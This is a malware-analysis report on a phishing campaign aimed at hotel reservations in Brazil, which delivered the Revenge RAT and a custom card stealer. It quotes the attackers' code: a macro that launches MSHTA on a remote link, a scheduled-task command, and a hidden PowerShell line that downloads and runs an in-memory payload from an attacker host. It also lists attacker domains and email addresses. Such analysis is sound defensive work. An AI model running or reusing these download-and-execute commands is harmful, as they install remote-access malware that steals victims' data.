@@ -1,0 +1,56 @@
+In December 2018, Palo Alto Networks Unit 42 researchers identified an ongoing campaign with a strong focus on the hospitality sector, specifically on hotel reservations.
+Although our initial analysis didn’t show any novel or advanced techniques, we did observe strong persistence during the campaign that triggered our curiosity.
+We followed network traces and pivoted on the information left behind by this actor, such as open directories, document metadata, and binary peculiarities, which enabled us to find a custom-made piece of malware, that we named “CapturaTela”.
+Our discovery of this malware family shows the reason for the persistent focus on hotel reservations as a primary vector: stealing credit card information from customers.
+We profiled this threat actor and that has resulted in uncovering not only their delivery mechanisms, but also their arsenal of remote access tools and info-stealing trojans, both acquired from underground forums as well as open source tools found in GitHub repositories.
+Have you ever wondered how an actor can run a very cheap and effective credit card data underground business?
+Welcome to “Operation Comando”.
+Our telemetry for this campaign identified email as the primary delivery mechanism and found the first related samples were distributed in August 2018.
+Topics used by the actor are typically related to travel bookings and vouchers, and target mainly Brazilian victims.
+Table 1 shows a representative list of typical subjects and attachment names found during the campaign.
+Table 1 Some email subjects and attachment names representative of this campaign.
+While investigating the malicious documents used in the campaign, we discovered an interesting consistency in the document metadata.
+The author consistently uses an acronym throughout their work – “C.D.T Original” (see details on Figure 1).
+Figure 1 Example of malicious document metadata
+The attackers make use of multiple common off-the-shelf methods that are observed in many campaigns, such as external references to remote scripts executed by MSHTA.
+Following this approach, this actor can find multiple tools and resources to perform their activities, and at the same time, make attribution and tracking more difficult for analysts.
+The most prevalent combinations of methods observed are depicted in Figure 2.
+Figure 2 Multiple delivery mechanisms.
+As an example of an email delivery used during December 2018 campaigns, let’s look at what pretended to be a rooming list (SHA256: ac70d15106cc368c571c3969c456778b494d62c5319dc366b7e2c116834c6187), which follows one path from Figure 2, more precisely the steps described in Figure 3.
+Figure 3 December 2018 campaign delivery example
+The malicious documents contain a simple Macro, which executes a remotely-hosted script using MSHTA:
+Public Sub Auto_Open()
+var0 = “MSHTA https://bit.ly/2QXNTHi”
+Var = var0
+Shell (Var)
+End Sub
+The landing URL resolves to:
+hxxps://internetexplorer200.blogspot.com/
+The statistics for the URL-shortened link on bit.ly confirm the observations from our telemetry, showing targets mainly in Brazil, as depicted in Figure 4 Distribution of Bit.ly campaign on 27-28th December.
+Figure 4 Distribution of Bit.ly campaign on 27-28th December
+MSHTA executes VBScript contents that are encoded/obfuscated using a very simple algorithm (note the presence of Portuguese words throughout the code).
+Figure 5 First stage VBScript code run via MSHTA
+This results in the following scheduled task created in the system, where a new second-stage script is invoked via MSHTA from another remote location.
+Note that the second-stage VB code contains a reference to “CDT” in a comment.
+“set shhh = CreateObject(\”WScript.Shell\”)\r\n Dim var1\r\n var1 = \”cmd.exe /c SchTasks /Create /sc MINUTE /MO 240 /TN AdobeUpdateSD /TR \”\”.exe https://minhacasaminhavidacdt.blogspot.com/\”\r\nshhh.run var1, vbHide\r\n”
+Figure 6 Second-stage VB script
+This second-stage VBScript code ends up loading a final payload in memory via PowerShell reflection, fetching the binary content from a file with a GIF extension:
+“CreateObject(\”Wscript.Shell\”).run \”cmd.exe /c powershell -ExecutionPolicy Bypass -windowstyle hidden -noexit -command [Reflection.Assembly]::Load([Convert]::FromBase64String((New-Object Net.WebClient).DownloadString(‘http://achoteis.com.br/images/64.gif’))).EntryPoint.Invoke($null,$null)\”\r\n”
+The final payload delivered in this case is Revenge Remote Access Trojan (RAT), a commodity tool which can be used to facilitate information theft.
+At the infrastructure level, the attacker makes use of dynamic DNS (DDNS) services such as DuckDNS, WinCo, or No-IP, many of which offer free accounts lowering the investment required for attacker infrastructure.
+Some examples of the domains in use are detailed in Table 2.
+Table 2 Examples of domains associated with this campaign using DDNS providers
+In addition to using free services, paste sites, and compromised sites, we have also identified at least one domain that appears to be actor-owned.
+The domain “fejalconstrucoes.com.br” has been used to host payloads, as well as send emails to potential victims.
+Figure 7 DNS WHOIS record shows details on the domain, which has been registered using the UOL service in Brazil.
+Figure 7 DNS WHOIS record
+Emails with malicious attachments belonging to this campaign have been found with the following characteristics:
+Domain: fejalconstrucoes.com.br
+Email Senders: mmcorrea@fejalconstrucoes.com.br, marcos@fejalconstrucoes.com.br
+Attachment names: Contrato Anual FEJAL Construçoes.ppa
+As mentioned before, an interesting detail on domains and paths used by the attacker is the use of the recurring acronym “CDT”, as for example:
+hxxp://bit.ly/cdtqueda
+hxxp://cdtoriginal.ddns.net
+During our investigation, one open directory identified allowed us to find several payloads used by the attacker.
+Table 3 displays the set of payloads and documents found.
+The acronym “CDT” keeps appearing even in file names used.
